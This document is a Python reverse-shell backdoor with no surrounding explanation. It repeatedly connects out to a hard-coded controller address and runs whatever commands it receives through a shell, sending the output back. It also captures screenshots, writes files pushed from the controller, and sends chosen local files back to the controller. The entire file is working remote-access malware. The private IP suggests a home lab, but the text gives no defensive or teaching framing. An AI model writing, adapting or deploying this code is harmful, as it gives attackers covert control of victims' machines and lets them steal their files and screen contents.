import socket
import time
import subprocess
import  os
import pyautogui


IDENTIFIER="XYZ"
size=2024

print(os.getcwd())
if __name__=="__main__":
    ipx="192.168.111.128"
    portx=8001
    b_ip=(ipx,portx)  
    while True:
        try:
            x=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            print("connectiong to ip",ipx)
            x.connect(b_ip)
            while True:
                data=x.recv(1023345)
                cmd1=data.decode()
                if cmd1=="stop":
                    break
                elif cmd1=="":
                    continue
                elif cmd1.startswith("cd"):
                    pathx=cmd1.strip("cd ")
                    if os.path.exists(pathx):
                        os.chdir(pathx)       
                    else:
                        print("stupid path")
                    continue
                elif cmd1=="screenshot":
                    print("taking screenshot")
                    screenshot=pyautogui.screenshot()
                    screenshot.save("pic_capture.png")
                    print("screenshot is saved")
                    continue
                elif cmd1.startswith("upload"):
                    ans=x.recv(1024).decode()
                    print("-------ans recieved-------","      ",ans)
                    if ans == "yes":
                        print("file exists>>>")
                        filex=cmd1.split(maxsplit=1)[1]
                        content=b""
                        print(" file is downloading.... ")
                        while True:
                            chunk=x.recv(size)
                            if chunk.endswith(IDENTIFIER.encode()):
                                chunk=chunk[:-len(IDENTIFIER)]
                                content += chunk
                                break
                            content+=chunk
                        with open(filex, "wb") as file:
                              file.write(content)
                        print(" >>> uploaded >>> ",filex)
                    else:
                        print("file not found !!! ")
                        continue
                elif cmd1.startswith("grab"):
                    filex=cmd1.split(maxsplit=1)[1]
                    if os.path.exists(filex):
                        ans="yes"
                        x.send(ans.encode())
                        with open(filex, "rb") as X:
                            chunk=X.read(size)
                            while len(chunk)>0:
                                x.send(chunk)
                                chunk=X.read(size)
                            x.send(IDENTIFIER.encode())
                        print("send was done successful ")
                    else:
                        print("nope wrong path bro")
                        ans="no"
                        x.send(ans.encode())
                        continue

                else:
                    output=subprocess.Popen(cmd1,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True)
                    print("output obtaineed \n")
                    try:
                        if output.stderr.read()=="":
                            IO=output.stdout.read()+IDENTIFIER
                            x.send(IO.encode())
                        else:
                            NO=output.stderr.read()+IDENTIFIER
                            x.send(NO.encode('cp1252'))
                            print("\n send NO was done")
                
                    except Exception as err:
                        print(err)
                    
        except KeyboardInterrupt:
            print("exting")
        except Exception as err:
            print("unable to connect: ",  err)
            time.sleep(5)
